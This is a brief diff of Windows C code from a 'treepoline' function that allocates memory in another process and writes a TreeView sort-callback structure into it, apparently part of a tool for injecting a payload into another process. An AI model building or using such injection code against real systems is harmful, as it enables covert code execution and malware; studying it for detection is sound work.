@@ -93,8 +93,7 @@ VOID treepoline(LPVOID payload, DWORD payloadSize) {
     tvs.lParam      = 0;
     
     // 5. Allocate RW memory and copy the TVSORTCB structure
-    ds = VirtualAllocEx(hp, NULL, 
-        sizeof(TVSORTCB) + sizeof(TVITEM),
+    ds = VirtualAllocEx(hp, NULL, sizeof(TVSORTCB),
         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
         
     WriteProcessMemory(hp, ds, &tvs, sizeof(TVSORTCB), &wr);
